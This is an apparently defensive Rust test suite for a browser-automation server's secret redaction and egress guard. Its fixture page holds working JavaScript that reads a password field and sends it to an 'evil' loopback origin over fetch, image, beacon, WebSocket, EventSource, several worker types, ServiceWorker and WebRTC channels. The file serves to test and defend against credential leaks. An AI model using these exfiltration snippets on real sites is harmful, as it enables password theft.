//! W3.16 gate: secret handles + origin-bound egress + redaction, on both backends.
//!
//! A hostile page reads the typed password out of its own DOM and tries to ship it to a second origin
//! four ways (fetch, img src, WebSocket frame, sendBeacon). All four must be refused and logged, the
//! same-origin login POST must carry the password, and the secret bytes must appear nowhere in the
//! transcript, the action log or the HTTP/page cache. `MANUK_SECRET_MUTATE=1` (guard off) must turn it red.

use std::io::{BufRead, BufReader, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::{Path, PathBuf};
use std::process::{Child, ChildStdin, ChildStdout, Command, Stdio};
use std::sync::{Arc, Mutex};

use serde_json::{json, Value};

const SECRET: &str = "Tr0ub4dor3-zq91x";
/// OS-keyring item (service=manuk, account=KEYRING_ITEM), stored by scripts/w316-keyring-gate.sh.
const KEYRING_ITEM: &str = "w3a16a-pw";
/// W3.16.a.b.a: reference answered by the SHIM-OP script (not 1Password) written by `write_shim_op`.
const OP_REF: &str = "op://test/item/password";
type Log = Arc<Mutex<Vec<String>>>;

fn page(evil: &str) -> String {
    let ws = evil.replace("http://", "ws://");
    format!(
        r#"<!doctype html><html><head><title>Portal</title></head><body><h1>Portal</h1>
<form method="post" action="/login"><input name="user" aria-label="Username"><input id="pw" name="pw" type="password" aria-label="Password"><button id="go">Log in</button></form>
<button type="button" id="x" onclick="
var v=document.getElementById('pw').value;
fetch('{evil}/f?d='+encodeURIComponent(v));
var im=document.createElement('img');im.src='{evil}/i?d='+encodeURIComponent(v);document.body.appendChild(im);
var w=new WebSocket('{ws}/w');w.onopen=function(){{w.send(v)}};
navigator.sendBeacon('{evil}/b',v);
">Exfil</button>
<button type="button" id="x2" onclick="
var v=document.getElementById('pw').value;
var b=new WebSocket('{ws}/wb');b.onopen=function(){{b.send(new Blob([v]))}};
new EventSource('{evil}/es?d='+encodeURIComponent(v));
var src='onmessage=function(e){{var v=e.data;fetch(\'{evil}/wf?d=\'+encodeURIComponent(v));var w=new WebSocket(\'{ws}/ww\');w.onopen=function(){{w.send(v)}};}}';
var k=new Worker(window.URL.createObjectURL(new Blob([src])));k.postMessage(v);
">Exfil2</button>
<button type="button" id="x3" onclick="
var v=document.getElementById('pw').value;
function wsleak(path){{return 'var w=new WebSocket(\''+'{ws}'+path+'\');w.onopen=function(){{w.send(DATA)}};'}}
var bl=function(t){{return window.URL.createObjectURL(new Blob([t],{{type:'text/javascript'}}))}};
var sw=new SharedWorker(bl('onconnect=function(c){{var p=c.ports[0];p.onmessage=function(e){{var DATA=e.data;'+wsleak('/sw')+'}}}}'));
sw.port.start();sw.port.postMessage(v);
var inner='onmessage=function(e){{var DATA=e.data;'+wsleak('/nw')+'}}';
var nw=new Worker(bl('onmessage=function(e){{var k=new Worker(URL.createObjectURL(new Blob([e.data.s],{{type:\'text/javascript\'}})));k.postMessage(e.data.v)}}'));
nw.postMessage({{s:inner,v:v}});
var lib=bl('export function leak(DATA){{'+wsleak('/wm')+'}}');
var mw=new Worker(bl('import {{leak}} from \''+lib+'\';postMessage(\'alive\');onmessage=function(e){{leak(e.data)}}'),{{type:'module'}});
mw.onmessage=function(e){{mw.postMessage(v)}};
var a=new RTCPeerConnection(),b=new RTCPeerConnection();
a.onicecandidate=function(e){{e.candidate&&b.addIceCandidate(e.candidate)}};b.onicecandidate=function(e){{e.candidate&&a.addIceCandidate(e.candidate)}};
b.ondatachannel=function(e){{e.channel.onmessage=function(m){{fetch('{evil}/rtc?d='+encodeURIComponent(m.data))}}}};
var ch=a.createDataChannel('x');ch.onopen=function(){{ch.send(v)}};
a.createOffer().then(function(o){{return a.setLocalDescription(o).then(function(){{return b.setRemoteDescription(o)}}).then(function(){{return b.createAnswer()}}).then(function(an){{return b.setLocalDescription(an).then(function(){{return a.setRemoteDescription(an)}})}})}});
">Exfil3</button>
<button type="button" id="x4" onclick="
var v=document.getElementById('pw').value;
window.__sw='pending';
navigator.serviceWorker.register('/sw.js?e='+encodeURIComponent('{evil}')).then(function(r){{window.__sw='registered';var w=r.installing||r.waiting||r.active;w.postMessage(v)}},function(e){{window.__sw='refused:'+e.name}});
try{{var p=new RTCPeerConnection({{iceServers:[{{urls:'stun:127.0.0.1:9',username:v,credential:v}}]}});p.createDataChannel('x');p.createOffer().then(function(o){{return p.setLocalDescription(o)}})}}catch(e){{}}
">Exfil4</button></body></html>"#
    )
}

/// One HTTP server that logs `METHOD path body` for every request; with `ws` it also completes WebSocket
/// handshakes and logs each text frame as `WS frame`.
fn serve(html: Arc<Mutex<String>>) -> (String, Log) {
    let log: Log = Arc::default();
    let l = TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = l.local_addr().unwrap();
    let lg = log.clone();
    std::thread::spawn(move || {
        for s in l.incoming() {
            let Ok(s) = s else { continue };
            let (lg, html) = (lg.clone(), html.clone());
            std::thread::spawn(move || conn(s, lg, html));
        }
    });
    (format!("http://{addr}"), log)
}

fn conn(mut s: TcpStream, lg: Log, html: Arc<Mutex<String>>) {
    let mut peek = [0u8; 2048];
    let n = s.peek(&mut peek).unwrap_or(0);
    if n == 0 {
        return;
    }
    if String::from_utf8_lossy(&peek[..n])
        .to_ascii_lowercase()
        .contains("upgrade: websocket")
    {
        let path = Arc::new(Mutex::new(String::new()));
        let pc = path.clone();
        let cb = move |r: &tungstenite::handshake::server::Request,
                       resp: tungstenite::handshake::server::Response| {
            *pc.lock().unwrap() = r.uri().path().to_string();
            Ok(resp)
        };
        if let Ok(mut ws) = tungstenite::accept_hdr(s, cb) {
            let path = path.lock().unwrap().clone();
            while let Ok(m) = ws.read() {
                match m {
                    tungstenite::Message::Text(t) => {
                        lg.lock().unwrap().push(format!("WS frame {path} {t}"))
                    }
                    tungstenite::Message::Binary(b) => lg
                        .lock()
                        .unwrap()
                        .push(format!("WS frame {path} {}", String::from_utf8_lossy(&b))),
                    _ => {}
                }
            }
        }
        return;
    }
    let mut buf = Vec::new();
    let mut chunk = [0u8; 4096];
    let head_end = loop {
        let n = s.read(&mut chunk).unwrap_or(0);
        if n == 0 {
            return;
        }
        buf.extend_from_slice(&chunk[..n]);
        if let Some(i) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
            break i + 4;
        }
    };
    let head = String::from_utf8_lossy(&buf[..head_end]).to_string();
    let first = head.lines().next().unwrap_or("").to_string();
    let want: usize = head
        .lines()
        .find_map(|l| {
            l.to_ascii_lowercase()
                .strip_prefix("content-length:")
                .map(|v| v.trim().parse().unwrap_or(0))
        })
        .unwrap_or(0);
    while buf.len() < head_end + want {
        let n = s.read(&mut chunk).unwrap_or(0);
        if n == 0 {
            break;
        }
        buf.extend_from_slice(&chunk[..n]);
    }
    let body = String::from_utf8_lossy(&buf[head_end..]).to_string();
    if !first.contains("favicon") {
        lg.lock().unwrap().push(format!("{first} | {body}"));
    }
    // W3.16.b.a.a: /sw.js?e=<evil origin> is a ServiceWorker script that ships whatever it is messaged
    // to the evil origin by fetch and WebSocket.
    let sw_evil = first
        .split_once("/sw.js?e=")
        .and_then(|(_, r)| r.split_whitespace().next())
        .map(|e| e.replace("%3A", ":").replace("%2F", "/"));
    let resp = if let Some(e) = &sw_evil {
        let ws = e.replace("http://", "ws://");
        format!("onmessage=function(ev){{var v=ev.data;fetch('{e}/swf?d='+encodeURIComponent(v));var w=new WebSocket('{ws}/sw2');w.onopen=function(){{w.send(v)}};}};")
    } else if first.contains(" / ") {
        html.lock().unwrap().clone()
    } else {
        "ok".into()
    };
    let ctype = if sw_evil.is_some() {
        "application/javascript"
    } else if first.contains(" / ") {
        "text/html"
    } else {
        "text/plain"
    };
    let _ = write!(
        s,
        "HTTP/1.1 200 OK\r\nContent-Type: {ctype}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{resp}",
        resp.len()
    );
}

struct Client {
    child: Child,
    tx: ChildStdin,
    rx: BufReader<ChildStdout>,
    id: u64,
    stderr: PathBuf,
}

impl Client {
    fn start(chrome: bool, dir: &Path, mutate: bool, keyring: Option<&str>) -> Client {
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_manuk-mcp"));
        if chrome {
            cmd.args(["--backend", "chrome"]);
        }
        if mutate {
            cmd.env("MANUK_SECRET_MUTATE", "1");
            // W3.16.b.a.a: the ServiceWorker/ICE refusals are structural, so the mutant switches them off too.
            cmd.env("MANUK_CDP_MUTATE", "no-sw-ice-guard");
        }
        let stderr = dir.join("stderr.txt");
        // MANUK_TAINT=off isolates the secret guard: the separate value-flow taint would otherwise
        // refuse these requests first, on the fixture's loopback URL token, and hide the mutant's leak.
        cmd.env("MANUK_TAINT", "off")
            .env("MANUK_ACTLOG_DIR", dir.join("actlog"))
            .env("MANUK_HTTP_CACHE_DIR", dir.join("cache"))
            .arg("--allow-write")
            .arg(dir);
        if let Some(item) = keyring {
            if item == OP_REF {
                let bin = write_shim_op(dir);
                cmd.env(
                    "PATH",
                    format!(
                        "{}:{}",
                        bin.display(),
                        std::env::var("PATH").unwrap_or_default()
                    ),
                );
            }
            // The password must come from the OS keyring (secret-tool), not the env provider. The confined
            // process cannot exec; the pre-confinement broker (W3.16.a.a) answers the lookup.
            cmd.env("MANUK_SECRET_ALLOW", item)
                .env_remove("MANUK_SECRET_PORTALPW");
        } else {
            cmd.env("MANUK_SECRET_PORTALPW", SECRET);
        }
        let mut child = cmd
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(std::fs::File::create(&stderr).unwrap())
            .spawn()
            .expect("spawn manuk-mcp");
        let tx = child.stdin.take().unwrap();
        let rx = BufReader::new(child.stdout.take().unwrap());
        let mut c = Client {
            child,
            tx,
            rx,
            id: 0,
            stderr,
        };
        c.rpc("initialize", json!({"protocolVersion": "2025-03-26", "capabilities": {}, "clientInfo": {"name": "t", "version": "0"}}));
        c.send(json!({"jsonrpc": "2.0", "method": "notifications/initialized"}));
        c
    }
    fn send(&mut self, v: Value) {
        writeln!(self.tx, "{v}").unwrap();
        self.tx.flush().unwrap();
    }
    fn rpc(&mut self, method: &str, params: Value) -> Value {
        self.id += 1;
        let id = self.id;
        self.send(json!({"jsonrpc": "2.0", "id": id, "method": method, "params": params}));
        loop {
            let mut line = String::new();
            assert!(
                self.rx.read_line(&mut line).unwrap() > 0,
                "server closed stdout"
            );
            let v: Value = serde_json::from_str(&line).unwrap();
            if v["id"] == json!(id) {
                return v;
            }
        }
    }
    fn call(&mut self, name: &str, args: Value) -> (bool, String) {
        let r = self.rpc("tools/call", json!({"name": name, "arguments": args}));
        let blocks = r["result"]["content"]
            .as_array()
            .cloned()
            .unwrap_or_default();
        (
            r["result"]["isError"].as_bool().unwrap_or(false),
            blocks
                .iter()
                .filter_map(|b| b["text"].as_str())
                .collect::<Vec<_>>()
                .join("\n"),
        )
    }
}
impl Drop for Client {
    fn drop(&mut self) {
        let _ = self.child.kill();
    }
}

fn handle_of(text: &str, needle: &str) -> String {
    let line = text
        .lines()
        .find(|l| l.contains(needle))
        .unwrap_or_else(|| panic!("no {needle:?} in:\n{text}"));
    let s = line.find("[h").unwrap();
    let e = line[s..].find(']').unwrap() + s;
    line[s + 1..e].to_string()
}

fn grep_dir(d: &Path, needle: &str) -> usize {
    let mut n = 0;
    if let Ok(rd) = std::fs::read_dir(d) {
        for e in rd.flatten() {
            let p = e.path();
            if p.is_dir() {
                n += grep_dir(&p, needle);
            } else if std::fs::read(&p)
                .is_ok_and(|b| b.windows(needle.len()).any(|w| w == needle.as_bytes()))
            {
                n += 1;
            }
        }
    }
    n
}

struct Outcome {
    transcript: String,
    evil: Vec<String>,
    app: Vec<String>,
    refusals: Vec<String>,
    store_hits: usize,
}

/// A shim `op` (labelled SHIM-OP, not 1Password): answers exactly `op read op://test/item/password`, and
/// records every argv so the test can prove the plumbing spawned it with the right arguments.
fn write_shim_op(dir: &Path) -> PathBuf {
    let bin = dir.join("shim-bin");
    std::fs::create_dir_all(&bin).unwrap();
    let f = bin.join("op");
    std::fs::write(
        &f,
        format!(
            "#!/bin/sh\n# SHIM-OP: not 1Password\necho \"$*\" >> \"{}/op-argv.log\"\n[ \"$*\" = \"read {OP_REF}\" ] && printf '%s\\n' '{SECRET}' || exit 1\n",
            dir.display()
        ),
    )
    .unwrap();
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
    bin
}

fn run(chrome: bool, mutate: bool, keyring: Option<&str>) -> Outcome {
    let dir = std::env::temp_dir().join(format!(
        "w316-{}-{chrome}-{mutate}-{}",
        std::process::id(),
        keyring.map(|k| k.len()).unwrap_or(0)
    ));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    let html = Arc::new(Mutex::new(String::new()));
    let (app, app_log) = serve(html.clone());
    let (evil, evil_log) = serve(Arc::new(Mutex::new(String::new())));
    *html.lock().unwrap() = page(&evil);
    let mut c = Client::start(chrome, &dir, mutate, keyring);
    let mut transcript = String::new();
    let mut step = |c: &mut Client, name: &str, args: Value| {
        let (_, t) = c.call(name, args);
        transcript.push_str(&t);
        transcript.push('\n');
        t
    };
    let nav = step(&mut c, "navigate", json!({"url": format!("{app}/")}));
    step(
        &mut c,
        "type",
        json!({"handle": handle_of(&nav, "\"Username\""), "text": "alice"}),
    );
    step(
        &mut c,
        "type",
        json!({"handle": handle_of(&nav, "\"Password\""), "secret": keyring.unwrap_or("portalpw")}),
    );
    step(
        &mut c,
        "act",
        json!({"handle": handle_of(&nav, "\"Exfil\""), "action": "click"}),
    );
    std::thread::sleep(std::time::Duration::from_millis(2500));
    // The manuk engine fetches a dynamically inserted <img> only when visuals load (a screenshot).
    step(&mut c, "screenshot", json!({}));
    if chrome {
        // W3.16.b: Blob WS frame, EventSource, and a dedicated worker that fetches and opens a WebSocket.
        step(
            &mut c,
            "act",
            json!({"handle": handle_of(&nav, "\"Exfil2\""), "action": "click"}),
        );
        std::thread::sleep(std::time::Duration::from_millis(2500));
    }
    if chrome {
        // W3.16.b.a: SharedWorker, nested worker, module worker with a static import, WebRTC data channel.
        step(
            &mut c,
            "act",
            json!({"handle": handle_of(&nav, "\"Exfil3\""), "action": "click"}),
        );
        std::thread::sleep(std::time::Duration::from_millis(4000));
        // W3.16.b.a.a: ServiceWorker registration + RTCPeerConnection ICE-server credentials.
        step(
            &mut c,
            "act",
            json!({"handle": handle_of(&nav, "\"Exfil4\""), "action": "click"}),
        );
        std::thread::sleep(std::time::Duration::from_millis(3000));
    }
    step(&mut c, "observe", json!({}));
    step(
        &mut c,
        "act",
        json!({"handle": handle_of(&nav, "\"Log in\""), "action": "click"}),
    );
    std::thread::sleep(std::time::Duration::from_millis(1500));
    step(&mut c, "observe", json!({}));
    let stderr = c.stderr.clone();
    drop(c);
    let refusals: Vec<String> = std::fs::read_to_string(stderr)
        .unwrap_or_default()
        .lines()
        .filter(|l| l.contains("EGRESS-DENIED (secret)"))
        .map(String::from)
        .collect();
    let store_hits = grep_dir(&dir.join("actlog"), SECRET) + grep_dir(&dir.join("cache"), SECRET);
    let (evil, app) = (
        evil_log.lock().unwrap().clone(),
        app_log.lock().unwrap().clone(),
    );
    Outcome {
        transcript,
        evil,
        app,
        refusals,
        store_hits,
    }
}

fn assert_green(chrome: bool, keyring: Option<&str>) {
    let o = run(chrome, false, keyring);
    assert!(
        !o.evil.iter().any(|l| l.contains(SECRET)),
        "secret reached evil origin: {:#?}",
        o.evil
    );
    for kind in ["page request", "WebSocket frame"] {
        assert!(
            o.refusals.iter().any(|r| r.contains(kind)),
            "no logged refusal for {kind}: {:#?}",
            o.refusals
        );
    }
    // Chrome fetches the late-inserted <img>, so it owes fetch + img + beacon. The manuk engine does not
    // fetch an <img> inserted after load (its images load once, in finish_loading; load_visuals is lean-only):
    // that channel never leaves the process even with the guard off, so manuk owes fetch + beacon.
    let owed = if chrome { 3 } else { 2 };
    let pr = o
        .refusals
        .iter()
        .filter(|r| r.contains("page request"))
        .count();
    assert!(
        pr >= owed,
        "want {owed} page-request refusals, got {pr}: {:#?}",
        o.refusals
    );
    if chrome {
        // W3.16.b: each residual channel is refused and logged (Blob frame, worker frame, worker fetch, EventSource).
        let wsf = o
            .refusals
            .iter()
            .filter(|r| r.contains("WebSocket frame"))
            .count();
        assert!(
            wsf >= 3,
            "want >=3 WS-frame refusals (text, Blob, worker), got {wsf}: {:#?}",
            o.refusals
        );
        // W3.16.b.a: SharedWorker, nested worker, module worker and each WebRTC data channel are refused too.
        assert!(
            wsf >= 6,
            "want >=6 WS-frame refusals incl. SharedWorker, nested, module worker, got {wsf}: {:#?}",
            o.refusals
        );
        assert!(
            o.refusals.iter().any(|r| r.contains("WebRTC data channel")),
            "no logged WebRTC data channel refusal: {:#?}",
            o.refusals
        );
        // W3.16.b.a.a: the ServiceWorker is never registered (so its fetch/WS cannot run) and the ICE-server
        // list carrying the secret as TURN credentials is stripped; both refusals are logged.
        for kind in ["ServiceWorker registration", "WebRTC ICE server list"] {
            assert!(
                o.refusals.iter().any(|r| r.contains(kind)),
                "no logged refusal for {kind}: {:#?}",
                o.refusals
            );
        }
        assert!(
            !o.evil
                .iter()
                .any(|l| l.contains("/swf") || l.contains("/sw2")),
            "ServiceWorker reached the evil origin: {:#?}",
            o.evil
        );
        assert!(
            pr >= 5,
            "want >=5 page-request refusals incl. worker fetch + EventSource, got {pr}: {:#?}",
            o.refusals
        );
    }
    assert!(
        o.app
            .iter()
            .any(|l| l.starts_with("POST /login") && l.contains(SECRET)),
        "same-origin login POST lacks the password: {:#?}",
        o.app
    );
    assert!(
        !o.transcript.contains(SECRET),
        "secret in transcript:\n{}",
        o.transcript
    );
    assert!(
        o.transcript.contains("•••"),
        "no mask in transcript:\n{}",
        o.transcript
    );
    assert_eq!(o.store_hits, 0, "secret bytes in the action log / cache");
}

/// W3.16.a: the TOTP provider's code equals `oathtool --totp -b --now=@<t> <seed>` at fixed times (oathtool
/// 2.6.x, reference codes generated for this gate). A wrong vector or a wrong HMAC/truncation goes red here.
#[test]
fn totp_equals_oathtool_at_fixed_times() {
    let vectors: &[(&str, u64, &str)] = &[
        ("GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ", 0, "755224"),
        ("GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ", 59, "287082"),
        ("GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ", 1000000000, "864010"),
        ("GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ", 1111111109, "081804"),
        ("GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ", 1234567890, "005924"),
        ("GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ", 1700000000, "921300"),
        ("GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ", 2000000000, "279037"),
        ("JBSWY3DPEHPK3PXP", 0, "282760"),
        ("JBSWY3DPEHPK3PXP", 59, "996554"),
        ("JBSWY3DPEHPK3PXP", 1000000000, "949556"),
        ("JBSWY3DPEHPK3PXP", 1111111109, "071271"),
        ("JBSWY3DPEHPK3PXP", 1234567890, "742275"),
        ("JBSWY3DPEHPK3PXP", 1700000000, "324550"),
        ("JBSWY3DPEHPK3PXP", 2000000000, "890699"),
    ];
    for (seed, t, want) in vectors {
        assert_eq!(
            manuk_net::secrets::totp(seed, *t).unwrap(),
            *want,
            "seed {seed} at t={t}"
        );
    }
}

#[test]
fn manuk_backend_blocks_all_four_and_login_succeeds() {
    assert_green(false, None);
}

#[test]
fn chrome_backend_blocks_all_four_and_login_succeeds() {
    assert_green(true, None);
}

/// Needs an unlocked Secret Service holding `KEYRING_ITEM` = SECRET (service=manuk). Build the store inside a
/// private session so the user's login keyring is untouched; run scripts/w316-keyring-gate.sh.
/// Ignored by default: a machine without that store must not look green.
#[test]
#[ignore = "needs an unlocked secret service holding KEYRING_ITEM; run scripts/w316-keyring-gate.sh"]
fn keyring_backend_blocks_all_four_and_login_succeeds() {
    let stored = std::process::Command::new("secret-tool")
        .args(["lookup", "service", "manuk", "account", KEYRING_ITEM])
        .output()
        .expect("secret-tool missing");
    assert_eq!(
        String::from_utf8_lossy(&stored.stdout).trim_end_matches('\n'),
        SECRET,
        "keyring item {KEYRING_ITEM} is not stored; the gate cannot run"
    );
    assert_green(false, Some(KEYRING_ITEM));
}

#[test]
#[ignore = "needs the keyring item; run scripts/w316-keyring-gate.sh"]
fn guard_off_keyring_run_leaks_so_the_gate_goes_red() {
    let o = run(false, true, Some(KEYRING_ITEM));
    assert!(
        o.evil.iter().any(|l| l.contains(SECRET)),
        "keyring mutant did not leak; the gate cannot go red: {:#?}",
        o.evil
    );
}

#[test]
fn guard_off_manuk_run_leaks_so_the_gate_goes_red() {
    let o = run(false, true, None);
    for ch in ["GET /f?", "POST /b", "WS frame"] {
        assert!(
            o.evil.iter().any(|l| l.contains(ch) && l.contains(SECRET)),
            "mutant lacks {ch}: {:#?}",
            o.evil
        );
    }
    assert!(
        o.evil.iter().any(|l| l.contains(SECRET)),
        "mutant did not leak; the gate cannot go red: {:#?}",
        o.evil
    );
}

#[test]
fn guard_off_chrome_run_leaks_so_the_gate_goes_red() {
    let o = run(true, true, None);
    assert!(
        o.evil.iter().any(|l| l.contains(SECRET)),
        "mutant did not leak; the gate cannot go red: {:#?}",
        o.evil
    );
}

#[test]
fn guard_off_chrome_run_leaks_the_w316b_channels() {
    let o = run(true, true, None);
    for ch in ["WS frame", "GET /wf?", "GET /es?"] {
        assert!(
            o.evil.iter().any(|l| l.contains(ch) && l.contains(SECRET)),
            "chrome mutant lacks {ch}: {:#?}",
            o.evil
        );
    }
}

#[test]
fn guard_off_chrome_run_leaks_the_w316ba_channels() {
    let o = run(true, true, None);
    for ch in ["WS frame", "GET /rtc?"] {
        assert!(
            o.evil.iter().any(|l| l.contains(ch) && l.contains(SECRET)),
            "chrome mutant lacks {ch}: {:#?}",
            o.evil
        );
    }
    // W3.16.b.a.a: the ServiceWorker's fetch and WebSocket reach the evil origin with the guard off.
    for ch in ["GET /swf?", "WS frame /sw2 "] {
        assert!(
            o.evil.iter().any(|l| l.contains(ch) && l.contains(SECRET)),
            "chrome mutant lacks ServiceWorker channel {ch}: {:#?}",
            o.evil
        );
    }
    for p in ["/sw", "/nw", "/wm"] {
        assert!(
            o.evil
                .iter()
                .any(|l| l.starts_with(&format!("WS frame {p} ")) && l.contains(SECRET)),
            "chrome mutant lacks WS {p}: {:#?}",
            o.evil
        );
    }
}

/// SEC.DID.7.a: a secret name outside the operator's list never reaches the argv of a provider process.
/// A fake `secret-tool` on PATH records every spawn; unlisted -> refused, no spawn; listed -> resolves.
fn fake_tool_run(allow: Option<&str>, name: &str) -> (bool, String, bool) {
    use std::os::unix::fs::PermissionsExt;
    let dir = std::env::temp_dir().join(format!(
        "sec-did7a-{}-{}",
        std::process::id(),
        allow.map_or(0, |a| a.len())
    ));
    let _ = std::fs::remove_dir_all(&dir);
    let bin = dir.join("bin");
    std::fs::create_dir_all(&bin).unwrap();
    let marker = dir.join("spawned");
    let tool = bin.join("secret-tool");
    std::fs::write(
        &tool,
        format!(
            "#!/bin/sh\necho \"$@\" >> {}\nprintf fake-pw-7a\n",
            marker.display()
        ),
    )
    .unwrap();
    std::fs::set_permissions(&tool, std::fs::Permissions::from_mode(0o755)).unwrap();
    let html = Arc::new(Mutex::new(
        "<!doctype html><title>t</title><input type=password aria-label=\"Password\">".to_string(),
    ));
    let (app, _log) = serve(html);
    let path = format!(
        "{}:{}",
        bin.display(),
        std::env::var("PATH").unwrap_or_default()
    );
    let mut cmd = Command::new(env!("CARGO_BIN_EXE_manuk-mcp"));
    cmd.env("PATH", path)
        .env_remove("MANUK_SECRET_ALLOW")
        .env("MANUK_ACTLOG_DIR", dir.join("actlog"))
        .env("MANUK_HTTP_CACHE_DIR", dir.join("cache"))
        .arg("--no-confine");
    if let Some(a) = allow {
        cmd.env("MANUK_SECRET_ALLOW", a);
    }
    let stderr = dir.join("stderr.txt");
    let mut child = cmd
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(std::fs::File::create(&stderr).unwrap())
        .spawn()
        .expect("spawn manuk-mcp");
    let tx = child.stdin.take().unwrap();
    let rx = BufReader::new(child.stdout.take().unwrap());
    let mut c = Client {
        child,
        tx,
        rx,
        id: 0,
        stderr,
    };
    c.rpc("initialize", json!({"protocolVersion": "2025-03-26", "capabilities": {}, "clientInfo": {"name": "t", "version": "0"}}));
    c.send(json!({"jsonrpc": "2.0", "method": "notifications/initialized"}));
    let (_, nav) = c.call("navigate", json!({"url": format!("{app}/")}));
    let (err, text) = c.call(
        "type",
        json!({"handle": handle_of(&nav, "\"Password\""), "secret": name}),
    );
    (err, text, marker.exists())
}

#[test]
fn secret_name_outside_operator_list_spawns_no_process() {
    let (err, text, spawned) = fake_tool_run(None, "somebody-elses-bank");
    assert!(err, "unlisted name must be refused: {text}");
    assert!(
        text.contains("MANUK_SECRET_ALLOW"),
        "refusal should say why: {text}"
    );
    assert!(!spawned, "secret-tool was spawned for an unlisted name");
    let (err, text, spawned) = fake_tool_run(Some("other"), "somebody-elses-bank");
    assert!(
        err && !spawned,
        "a different listed name must not admit this one: {text}"
    );
}

#[test]
fn secret_name_in_operator_list_still_resolves() {
    let (err, text, spawned) = fake_tool_run(Some("a, mine ,b"), "mine");
    assert!(!err, "listed name must resolve: {text}");
    assert!(
        spawned,
        "secret-tool should have been asked for a listed name: {text}"
    );
    assert!(
        !text.contains("fake-pw-7a"),
        "secret bytes leaked into the result: {text}"
    );
}

/// W3.16.a.b.a (SHIM-OP, does not prove 1Password): `type(secret='op://test/item/password')` makes the
/// secrets plumbing spawn `op read <ref>` (allow-listed via MANUK_SECRET_ALLOW), fills the same-origin login,
/// and the egress gate still refuses the shimmed value to a foreign origin.
#[test]
fn shim_op_backend_blocks_all_four_and_login_succeeds() {
    assert_green(false, Some(OP_REF));
    let argv = std::fs::read_to_string(
        std::env::temp_dir()
            .join(format!(
                "w316-{}-false-false-{}",
                std::process::id(),
                OP_REF.len()
            ))
            .join("op-argv.log"),
    )
    .unwrap_or_default();
    assert!(
        argv.lines().any(|l| l == format!("read {OP_REF}")),
        "shim op was never asked `read {OP_REF}`: {argv:?}"
    );
}

#[test]
fn guard_off_shim_op_run_leaks_so_the_gate_goes_red() {
    let o = run(false, true, Some(OP_REF));
    assert!(
        o.evil.iter().any(|l| l.contains(SECRET)),
        "shim-op mutant did not leak; the gate cannot go red: {:#?}",
        o.evil
    );
}
